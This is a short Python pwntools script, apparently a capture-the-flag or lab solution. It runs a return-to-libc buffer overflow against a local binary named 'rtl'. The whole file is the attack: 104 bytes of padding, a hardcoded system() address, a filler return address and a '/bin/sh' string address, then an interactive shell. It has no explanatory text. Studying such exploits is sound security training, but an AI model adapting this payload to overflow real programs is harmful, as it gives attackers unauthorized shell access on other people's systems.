from pwn import *

p = process("./rtl")

systemAddr = 0xf7e21d10
shAddr = 0xf7f608cf

payload = "A"*104
payload += p32(systemAddr)
payload += "AAAA"
payload += p32(shAddr)

p.send(payload)
p.interactive()

